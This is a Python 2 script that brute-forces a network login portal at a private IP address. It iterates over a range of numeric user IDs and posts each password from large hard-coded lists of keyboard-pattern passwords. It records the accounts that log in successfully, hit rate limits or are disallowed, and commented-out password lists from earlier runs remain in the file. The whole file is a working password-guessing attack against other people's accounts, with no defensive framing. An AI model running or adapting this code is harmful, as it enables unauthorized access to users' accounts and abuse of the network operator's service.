import urllib
import time
import datetime
import urllib2
import sys
import xml.dom.minidom as XML
#16101001
#16803030

#161012243
def fun():
	#us=[16101001, 16101002, 16101004, 16101005, 16101006, 16101007, 16101008, 16101009, 16101010, 16101011, 16101013, 16101014, 16101016, 16101017, 16101018, 16101019, 16101020, 16101021, 16101022, 16101023 ]
	start=16101041
	end= 16101061																																																																																						
	#password1=['gg66yy', 77uu88', 'ii9988','rr55tt', '66tt55' ,'tt55rr', 'uu77yy', 'uu7766','tt5566' ]
	#password=['11qq22', '11qq33', '11ww22', '11ww33', '11ee22', '11ee33', '22qq11', '22qq33', '22ww11', '22ww33', '22ww44', '22ee11', '22ee33', '22ee44', '22rr33', '22rr44', '33qq11', '33qq22', '33ww11', '33ww22', '33ww44', '33ee11', '33ee22', '33ee44', '33ee55', '33rr22', '33rr44', '33rr55', '33tt44', '33tt55', '44ww22', '44ww33', '44ee22', '44ee33', '44ee55', '44rr22', '44rr33', '44rr55', '44rr66', '44tt33', '44tt55', '44tt66', '44yy55', '44yy66', '55ee33', '55ee44', '55rr33', '55rr44', '55rr66', '55tt33', '55tt44', '55tt66', '55tt77', '55yy44', '55yy66', '55yy77', '55uu66', '55uu77', '66rr44', '66rr55', '66tt44', '66tt55', '66tt77', '66yy44', '66yy55', '66yy77', '66yy88', '66uu55', '66uu77', '66uu88', '66ii77', '66ii88', '77tt55', '77tt66', '77yy55', '77yy66', '77yy88', '77uu55', '77uu66', '77uu88', '77uu99', '77ii66', '77ii88', '77ii99', '77oo88', '77oo99', '88yy66', '88yy77', '88uu66', '88uu77', '88uu99', '88ii66', '88ii77', '88ii99', '88ii00', '88oo77', '88oo99', '88oo00', '88pp99', '88pp00', '99uu77', '99uu88', '99ii77', '99ii88', '99ii00', '99oo77', '99oo88', '99oo00', '99pp88', '99pp00', '00ii88', '00ii99', '00oo88', '00oo99', '00pp88', '00pp99', 'qq11ww', 'qq11ee', 'qq22ww', 'qq22ee', 'qq33ww', 'qq33ee', 'ww11qq', 'ww11ee', 'ww22qq', 'ww22ee', 'ww22rr', 'ww33qq', 'ww33ee', 'ww33rr', 'ww44ee', 'ww44rr', 'ee11qq', 'ee11ww', 'ee22qq', 'ee22ww', 'ee22rr', 'ee33qq', 'ee33ww', 'ee33rr', 'ee33tt', 'ee44ww', 'ee44rr', 'ee44tt', 'ee55rr', 'ee55tt', 'rr22ww', 'rr22ee', 'rr33ww', 'rr33ee', 'rr33tt', 'rr44ww', 'rr44ee', 'rr44tt', 'rr44yy', 'rr55ee', 'rr55tt', 'rr55yy', 'rr66tt', 'rr66yy', 'tt33ee', 'tt33rr', 'tt44ee', 'tt44rr', 'tt44yy', 'tt55ee', 'tt55rr', 'tt55yy', 'tt55uu', 'tt66rr', 'tt66yy', 'tt66uu', 'tt77yy', 'tt77uu', 'yy44rr', 'yy44tt', 'yy55rr', 'yy55tt', 'yy55uu', 'yy66rr', 'yy66tt', 'yy66uu', 'yy66ii', 'yy77tt', 'yy77uu', 'yy77ii', 'yy88uu', 'yy88ii', 'uu55tt', 'uu55yy', 'uu66tt', 'uu66yy', 'uu66ii', 'uu77tt', 'uu77yy', 'uu77ii', 'uu77oo', 'uu88yy', 'uu88ii', 'uu88oo', 'uu99ii', 'uu99oo', 'ii66yy', 'ii66uu', 'ii77yy', 'ii77uu', 'ii77oo', 'ii88yy', 'ii88uu', 'ii88oo', 'ii88pp', 'ii99uu', 'ii99oo', 'ii99pp', 'ii00oo', 'ii00pp', 'oo77uu', 'oo77ii', 'oo88uu', 'oo88ii', 'oo88pp', 'oo99uu', 'oo99ii', 'oo99pp', 'oo00ii', 'oo00pp', 'pp88ii', 'pp88oo', 'pp99ii', 'pp99oo', 'pp00ii', 'pp00oo']	
	#password=['qq1122', 'qq1133', 'qq2211', 'qq2233', 'qq3311', 'qq3322', 'ww1122', 'ww1133', 'ww2211', 'ww2233', 'ww2244', 'ww3311', 'ww3322', 'ww3344', 'ww4422', 'ww4433', 'ee1122', 'ee1133', 'ee2211', 'ee2233', 'ee2244', 'ee3311', 'ee3322', 'ee3344', 'ee3355', 'ee4422', 'ee4433', 'ee4455', 'ee5533', 'ee5544', 'rr2233', 'rr2244', 'rr3322', 'rr3344', 'rr3355', 'rr4422', 'rr4433', 'rr4455', 'rr4466', 'rr5533', 'rr5544', 'rr5566', 'rr6644', 'rr6655', 'tt3344', 'tt3355', 'tt4433', 'tt4455', 'tt4466', 'tt5533', 'tt5544', 'tt5566', 'tt5577', 'tt6644', 'tt6655', 'tt6677', 'tt7755', 'tt7766', 'yy4455', 'yy4466', 'yy5544', 'yy5566', 'yy5577', 'yy6644', 'yy6655', 'yy6677', 'yy6688', 'yy7755', 'yy7766', 'yy7788', 'yy8866', 'yy8877', 'uu5566', 'uu5577', 'uu6655', 'uu6677', 'uu6688', 'uu7755', 'uu7766', 'uu7788', 'uu7799', 'uu8866', 'uu8877', 'uu8899', 'uu9977', 'uu9988', 'ii6677', 'ii6688', 'ii7766', 'ii7788', 'ii7799', 'ii8866', 'ii8877', 'ii8899', 'ii8800', 'ii9977', 'ii9988', 'ii9900', 'ii0088', 'ii0099', 'oo7788', 'oo7799', 'oo8877', 'oo8899', 'oo8800', 'oo9977', 'oo9988', 'oo9900', 'oo0088', 'oo0099', 'pp8899', 'pp8800', 'pp9988', 'pp9900', 'pp0088', 'pp0099', '1122qq', '1122ww', '1122ee', '1133qq', '1133ww', '1133ee', '2211qq', '2211ww', '2211ee', '2233qq', '2233ww', '2233ee', '2233rr', '2244ww', '2244ee', '2244rr', '3311qq', '3311ww', '3311ee', '3322qq', '3322ww', '3322ee', '3322rr', '3344ww', '3344ee', '3344rr', '3344tt', '3355ee', '3355rr', '3355tt', '4422ww', '4422ee', '4422rr', '4433ww', '4433ee', '4433rr', '4433tt', '4455ee', '4455rr', '4455tt', '4455yy', '4466rr', '4466tt', '4466yy', '5533ee', '5533rr', '5533tt', '5544ee', '5544rr', '5544tt', '5544yy', '5566rr', '5566tt', '5566yy', '5566uu', '5577tt', '5577yy', '5577uu', '6644rr', '6644tt', '6644yy', '6655rr', '6655tt', '6655yy', '6655uu', '6677tt', '6677yy', '6677uu', '6677ii', '6688yy', '6688uu', '6688ii', '7755tt', '7755yy', '7755uu', '7766tt', '7766yy', '7766uu', '7766ii', '7788yy', '7788uu', '7788ii', '7788oo', '7799uu', '7799ii', '7799oo', '8866yy', '8866uu', '8866ii', '8877yy', '8877uu', '8877ii', '8877oo', '8899uu', '8899ii', '8899oo', '8899pp', '8800ii', '8800oo', '8800pp', '9977uu', '9977ii', '9977oo', '9988uu', '9988ii', '9988oo', '9988pp', '9900ii', '9900oo', '9900pp', '0088ii', '0088oo', '0088pp', '0099ii', '0099oo', '0099pp']
	#nofound __password=['aa1122', 'aa1133', 'aa2211', 'aa2233', 'aa3311', 'aa3322', 'ss1122', 'ss1133', 'ss2211', 'ss2233', 'ss2244', 'ss3311', 'ss3322', 'ss3344', 'ss4422', 'ss4433', 'dd1122', 'dd1133', 'dd2211', 'dd2233', 'dd2244', 'dd3311', 'dd3322', 'dd3344', 'dd3355', 'dd4422', 'dd4433', 'dd4455', 'dd5533', 'dd5544', 'ff2233', 'ff2244', 'ff3322', 'ff3344', 'ff3355', 'ff4422', 'ff4433', 'ff4455', 'ff4466', 'ff5533', 'ff5544', 'ff5566', 'ff6644', 'ff6655', 'gg3344', 'gg3355', 'gg4433', 'gg4455', 'gg4466', 'gg5533', 'gg5544', 'gg5566', 'gg5577', 'gg6644', 'gg6655', 'gg6677', 'gg7755', 'gg7766', 'hh4455', 'hh4466', 'hh5544', 'hh5566', 'hh5577', 'hh6644', 'hh6655', 'hh6677', 'hh6688', 'hh7755', 'hh7766', 'hh7788', 'hh8866', 'hh8877', 'jj5566', 'jj5577', 'jj6655', 'jj6677', 'jj6688', 'jj7755', 'jj7766', 'jj7788', 'jj7799', 'jj8866', 'jj8877', 'jj8899', 'jj9977', 'jj9988', 'kk6677', 'kk6688', 'kk7766', 'kk7788', 'kk7799', 'kk8866', 'kk8877', 'kk8899', 'kk8800', 'kk9977', 'kk9988', 'kk9900', 'kk0088', 'kk0099', 'll7788', 'll7799', 'll8877', 'll8899', 'll8800', 'll9977', 'll9988', 'll9900', 'll0088', 'll0099', 'll8899', 'll8800', 'll9988', 'll9900', 'll0088', 'll0099', '11aaaa', '11aass', '11aadd', '11ssaa', '11ssss', '11ssdd', '11ddaa', '11ddss', '11dddd', '22aaaa', '22aass', '22aadd', '22ssaa', '22ssss', '22ssdd', '22ssff', '22ddaa', '22ddss', '22dddd', '22ddff', '22ffss', '22ffdd', '22ffff', '33aaaa', '33aass', '33aadd', '33ssaa', '33ssss', '33ssdd', '33ssff', '33ddaa', '33ddss', '33dddd', '33ddff', '33ddgg', '33ffss', '33ffdd', '33ffff', '33ffgg', '33ggdd', '33ggff', '33gggg', '44ssss', '44ssdd', '44ssff', '44ddss', '44dddd', '44ddff', '44ddgg', '44ffss', '44ffdd', '44ffff', '44ffgg', '44ffhh', '44ggdd', '44ggff', '44gggg', '44gghh', '44hhff', '44hhgg', '44hhhh', '55dddd', '55ddff', '55ddgg', '55ffdd', '55ffff', '55ffgg', '55ffhh', '55ggdd', '55ggff', '55gggg', '55gghh', '55ggjj', '55hhff', '55hhgg', '55hhhh', '55hhjj', '55jjgg', '55jjhh', '55jjjj', '66ffff', '66ffgg', '66ffhh', '66ggff', '66gggg', '66gghh', '66ggjj', '66hhff', '66hhgg', '66hhhh', '66hhjj', '66hhkk', '66jjgg', '66jjhh', '66jjjj', '66jjkk', '66kkhh', '66kkjj', '66kkkk', '77gggg', '77gghh', '77ggjj', '77hhgg', '77hhhh', '77hhjj', '77hhkk', '77jjgg', '77jjhh', '77jjjj', '77jjkk', '77jjll', '77kkhh', '77kkjj', '77kkkk', '77kkll', '77lljj', '77llkk', '77llll', '88hhhh', '88hhjj', '88hhkk', '88jjhh', '88jjjj', '88jjkk', '88jjll', '88kkhh', '88kkjj', '88kkkk', '88kkll', '88kkll', '88lljj', '88llkk', '88llll', '88llll', '88llkk', '88llll', '88llll', '99jjjj', '99jjkk', '99jjll', '99kkjj', '99kkkk', '99kkll', '99kkll', '99lljj', '99llkk', '99llll', '99llll', '99llkk', '99llll', '99llll', '00kkkk', '00kkll', '00kkll', '00llkk', '00llll', '00llll', '00llkk', '00llll', '00llll']
	#password=['11qqaa', '11qqss', '11qqdd', '11wwaa', '11wwss', '11wwdd', '11eeaa', '11eess', '11eedd', '22qqaa', '22qqss', '22qqdd', '22wwaa', '22wwss', '22wwdd', '22wwff', '22eeaa', '22eess', '22eedd', '22eeff', '22rrss', '22rrdd', '22rrff', '33qqaa', '33qqss', '33qqdd', '33wwaa', '33wwss', '33wwdd', '33wwff', '33eeaa', '33eess', '33eedd', '33eeff', '33eegg', '33rrss', '33rrdd', '33rrff', '33rrgg', '33ttdd', '33ttff', '33ttgg', '44wwss', '44wwdd', '44wwff', '44eess', '44eedd', '44eeff', '44eegg', '44rrss', '44rrdd', '44rrff', '44rrgg', '44rrhh', '44ttdd', '44ttff', '44ttgg', '44tthh', '44yyff', '44yygg', '44yyhh', '55eedd', '55eeff', '55eegg', '55rrdd', '55rrff', '55rrgg', '55rrhh', '55ttdd', '55ttff', '55ttgg', '55tthh', '55ttjj', '55yyff', '55yygg', '55yyhh', '55yyjj', '55uugg', '55uuhh', '55uujj', '66rrff', '66rrgg', '66rrhh', '66ttff', '66ttgg', '66tthh', '66ttjj', '66yyff', '66yygg', '66yyhh', '66yyjj', '66yykk', '66uugg', '66uuhh', '66uujj', '66uukk', '66iihh', '66iijj', '66iikk', '77ttgg', '77tthh', '77ttjj', '77yygg', '77yyhh', '77yyjj', '77yykk', '77uugg', '77uuhh', '77uujj', '77uukk', '77uull', '77iihh', '77iijj', '77iikk', '77iill', '77oojj', '77ookk', '77ooll', '88yyhh', '88yyjj', '88yykk', '88uuhh', '88uujj', '88uukk', '88uull', '88iihh', '88iijj', '88iikk', '88iill', '88iill', '88oojj', '88ookk', '88ooll', '88ooll', '88ppkk', '88ppll', '88ppll', '99uujj', '99uukk', '99uull', '99iijj', '99iikk', '99iill', '99iill', '99oojj', '99ookk', '99ooll', '99ooll', '99ppkk', '99ppll', '99ppll', '00iikk', '00iill', '00iill', '00ookk', '00ooll', '00ooll', '00ppkk', '00ppll', '00ppll', 'qq11aa', 'qq11ss', 'qq11dd', 'qq22aa', 'qq22ss', 'qq22dd', 'qq33aa', 'qq33ss', 'qq33dd', 'ww11aa', 'ww11ss', 'ww11dd', 'ww22aa', 'ww22ss', 'ww22dd', 'ww22ff', 'ww33aa', 'ww33ss', 'ww33dd', 'ww33ff', 'ww44ss', 'ww44dd', 'ww44ff', 'ee11aa', 'ee11ss', 'ee11dd', 'ee22aa', 'ee22ss', 'ee22dd', 'ee22ff', 'ee33aa', 'ee33ss', 'ee33dd', 'ee33ff', 'ee33gg', 'ee44ss', 'ee44dd', 'ee44ff', 'ee44gg', 'ee55dd', 'ee55ff', 'ee55gg', 'rr22ss', 'rr22dd', 'rr22ff', 'rr33ss', 'rr33dd', 'rr33ff', 'rr33gg', 'rr44ss', 'rr44dd', 'rr44ff', 'rr44gg', 'rr44hh', 'rr55dd', 'rr55ff', 'rr55gg', 'rr55hh', 'rr66ff', 'rr66gg', 'rr66hh', 'tt33dd', 'tt33ff', 'tt33gg', 'tt44dd', 'tt44ff', 'tt44gg', 'tt44hh', 'tt55dd', 'tt55ff', 'tt55gg', 'tt55hh', 'tt55jj', 'tt66ff', 'tt66gg', 'tt66hh', 'tt66jj', 'tt77gg', 'tt77hh', 'tt77jj', 'yy44ff', 'yy44gg', 'yy44hh', 'yy55ff', 'yy55gg', 'yy55hh', 'yy55jj', 'yy66ff', 'yy66gg', 'yy66hh', 'yy66jj', 'yy66kk', 'yy77gg', 'yy77hh', 'yy77jj', 'yy77kk', 'yy88hh', 'yy88jj', 'yy88kk', 'uu55gg', 'uu55hh', 'uu55jj', 'uu66gg', 'uu66hh', 'uu66jj', 'uu66kk', 'uu77gg', 'uu77hh', 'uu77jj', 'uu77kk', 'uu77ll', 'uu88hh', 'uu88jj', 'uu88kk', 'uu88ll', 'uu99jj', 'uu99kk', 'uu99ll', 'ii66hh', 'ii66jj', 'ii66kk', 'ii77hh', 'ii77jj', 'ii77kk', 'ii77ll', 'ii88hh', 'ii88jj', 'ii88kk', 'ii88ll', 'ii88ll', 'ii99jj', 'ii99kk', 'ii99ll', 'ii99ll', 'ii00kk', 'ii00ll', 'ii00ll', 'oo77jj', 'oo77kk', 'oo77ll', 'oo88jj', 'oo88kk', 'oo88ll', 'oo88ll', 'oo99jj', 'oo99kk', 'oo99ll', 'oo99ll', 'oo00kk', 'oo00ll', 'oo00ll', 'pp88kk', 'pp88ll', 'pp88ll', 'pp99kk', 'pp99ll', 'pp99ll', 'pp00kk', 'pp00ll', 'pp00ll', 'aa11qq', 'aa11ww', 'aa11ee', 'aa22qq', 'aa22ww', 'aa22ee', 'aa33qq', 'aa33ww', 'aa33ee', 'ss11qq', 'ss11ww', 'ss11ee', 'ss22qq', 'ss22ww', 'ss22ee', 'ss22rr', 'ss33qq', 'ss33ww', 'ss33ee', 'ss33rr', 'ss44ww', 'ss44ee', 'ss44rr', 'dd11qq', 'dd11ww', 'dd11ee', 'dd22qq', 'dd22ww', 'dd22ee', 'dd22rr', 'dd33qq', 'dd33ww', 'dd33ee', 'dd33rr', 'dd33tt', 'dd44ww', 'dd44ee', 'dd44rr', 'dd44tt', 'dd55ee', 'dd55rr', 'dd55tt', 'ff22ww', 'ff22ee', 'ff22rr', 'ff33ww', 'ff33ee', 'ff33rr', 'ff33tt', 'ff44ww', 'ff44ee', 'ff44rr', 'ff44tt', 'ff44yy', 'ff55ee', 'ff55rr', 'ff55tt', 'ff55yy', 'ff66rr', 'ff66tt', 'ff66yy', 'gg33ee', 'gg33rr', 'gg33tt', 'gg44ee', 'gg44rr', 'gg44tt', 'gg44yy', 'gg55ee', 'gg55rr', 'gg55tt', 'gg55yy', 'gg55uu', 'gg66rr', 'gg66tt', 'gg66yy', 'gg66uu', 'gg77tt', 'gg77yy', 'gg77uu', 'hh44rr', 'hh44tt', 'hh44yy', 'hh55rr', 'hh55tt', 'hh55yy', 'hh55uu', 'hh66rr', 'hh66tt', 'hh66yy', 'hh66uu', 'hh66ii', 'hh77tt', 'hh77yy', 'hh77uu', 'hh77ii', 'hh88yy', 'hh88uu', 'hh88ii', 'jj55tt', 'jj55yy', 'jj55uu', 'jj66tt', 'jj66yy', 'jj66uu', 'jj66ii', 'jj77tt', 'jj77yy', 'jj77uu', 'jj77ii', 'jj77oo', 'jj88yy', 'jj88uu', 'jj88ii', 'jj88oo', 'jj99uu', 'jj99ii', 'jj99oo', 'kk66yy', 'kk66uu', 'kk66ii', 'kk77yy', 'kk77uu', 'kk77ii', 'kk77oo', 'kk88yy', 'kk88uu', 'kk88ii', 'kk88oo', 'kk88pp', 'kk99uu', 'kk99ii', 'kk99oo', 'kk99pp', 'kk00ii', 'kk00oo', 'kk00pp', 'll77uu', 'll77ii', 'll77oo', 'll88uu', 'll88ii', 'll88oo', 'll88pp', 'll99uu', 'll99ii', 'll99oo', 'll99pp', 'll00ii', 'll00oo', 'll00pp', 'll88ii', 'll88oo', 'll88pp', 'll99ii', 'll99oo', 'll99pp', 'll00ii', 'll00oo', 'll00pp']
	password=['qqww11', 'qqww22', 'qqww33', 'qqee11', 'qqee22', 'qqee33', 'wwqq11', 'wwqq22', 'wwqq33', 'wwee11', 'wwee22', 'wwee33', 'wwee44', 'wwrr22', 'wwrr33', 'wwrr44', 'eeqq11', 'eeqq22', 'eeqq33', 'eeww11', 'eeww22', 'eeww33', 'eeww44', 'eerr22', 'eerr33', 'eerr44', 'eerr55', 'eett33', 'eett44', 'eett55', 'rrww22', 'rrww33', 'rrww44', 'rree22', 'rree33', 'rree44', 'rree55', 'rrtt33', 'rrtt44', 'rrtt55', 'rrtt66', 'rryy44', 'rryy55', 'rryy66', 'ttee33', 'ttee44', 'ttee55', 'ttrr33', 'ttrr44', 'ttrr55', 'ttrr66', 'ttyy44', 'ttyy55', 'ttyy66', 'ttyy77', 'ttuu55', 'ttuu66', 'ttuu77', 'yyrr44', 'yyrr55', 'yyrr66', 'yytt44', 'yytt55', 'yytt66', 'yytt77', 'yyuu55', 'yyuu66', 'yyuu77', 'yyuu88', 'yyii66', 'yyii77', 'yyii88', 'uutt55', 'uutt66', 'uutt77', 'uuyy55', 'uuyy66', 'uuyy77', 'uuyy88', 'uuii66', 'uuii77', 'uuii88', 'uuii99', 'uuoo77', 'uuoo88', 'uuoo99', 'iiyy66', 'iiyy77', 'iiyy88', 'iiuu66', 'iiuu77', 'iiuu88', 'iiuu99', 'iioo77', 'iioo88', 'iioo99', 'iioo00', 'iipp88', 'iipp99', 'iipp00', 'oouu77', 'oouu88', 'oouu99', 'ooii77', 'ooii88', 'ooii99', 'ooii00', 'oopp88', 'oopp99', 'oopp00', 'ppii88', 'ppii99', 'ppii00', 'ppoo88', 'ppoo99', 'ppoo00', '11qqww', '11qqee', '11wwqq', '11wwee', '11eeqq', '11eeww', '22qqww', '22qqee', '22wwqq', '22wwee', '22wwrr', '22eeqq', '22eeww', '22eerr', '22rrww', '22rree', '33qqww', '33qqee', '33wwqq', '33wwee', '33wwrr', '33eeqq', '33eeww', '33eerr', '33eett', '33rrww', '33rree', '33rrtt', '33ttee', '33ttrr', '44wwee', '44wwrr', '44eeww', '44eerr', '44eett', '44rrww', '44rree', '44rrtt', '44rryy', '44ttee', '44ttrr', '44ttyy', '44yyrr', '44yytt', '55eerr', '55eett', '55rree', '55rrtt', '55rryy', '55ttee', '55ttrr', '55ttyy', '55ttuu', '55yyrr', '55yytt', '55yyuu', '55uutt', '55uuyy', '66rrtt', '66rryy', '66ttrr', '66ttyy', '66ttuu', '66yyrr', '66yytt', '66yyuu', '66yyii', '66uutt', '66uuyy', '66uuii', '66iiyy', '66iiuu', '77ttyy', '77ttuu', '77yytt', '77yyuu', '77yyii', '77uutt', '77uuyy', '77uuii', '77uuoo', '77iiyy', '77iiuu', '77iioo', '77oouu', '77ooii', '88yyuu', '88yyii', '88uuyy', '88uuii', '88uuoo', '88iiyy', '88iiuu', '88iioo', '88iipp', '88oouu', '88ooii', '88oopp', '88ppii', '88ppoo', '99uuii', '99uuoo', '99iiuu', '99iioo', '99iipp', '99oouu', '99ooii', '99oopp', '99ppii', '99ppoo', '00iioo', '00iipp', '00ooii', '00oopp', '00ppii', '00ppoo']

	day = open("day.txt", "w")
	hos = open("hos.txt", "w")
	
	op = open("open.txt", "w")
	passes=open("passes.txt", "w")
	passes.write("[")
	url = 'http://172.16.68.6:8090/httpclient.html'
	#username=''
	#password=''
	for username in range(start, end):
		username=str(username)
		ii=0
		for pass1 in password:
			ii+=1
			post_data = 'mode=191' + '&username=' + username + '&password=' + pass1
			req = urllib2.Request(url, post_data)
			response = urllib2.urlopen(req)
			xml_dom = XML.parseString(response.read())
			document = xml_dom.documentElement
			response = document.getElementsByTagName('message')[0].childNodes[0].nodeValue
			if ii%25==0:
				print username

			kk="\n"+username +" "+ pass1+"\n"
				
			if 'successfully' in response:
				print 'sucess', username, pass1
				hos.write(kk)
				op.write(kk)
				passes.write(username+", '")
				break;
			elif 'Limit' in response:
				print 'limit '+pass1
			    #kk=username , password
				hos.write(kk)

				passes.write(username+", '")
				break;
			elif 'allowed ' in response:
				print 'not allowed'+ pass1
				#kk=username , password
				day.write(kk)    

				passes.write(username+", '")
				break;
			elif 'data' in response:
				print 'data ' + pass1
			    #kk=username , password
				hos.write(kk)

				passes.write(username+", '")
				break;

	passes.write("]")
	passes.close()
	op.close()
	hos.close()
	day.close()

if __name__ == '__main__':
	#password=['77uu88', 'ii9988']
	fun()



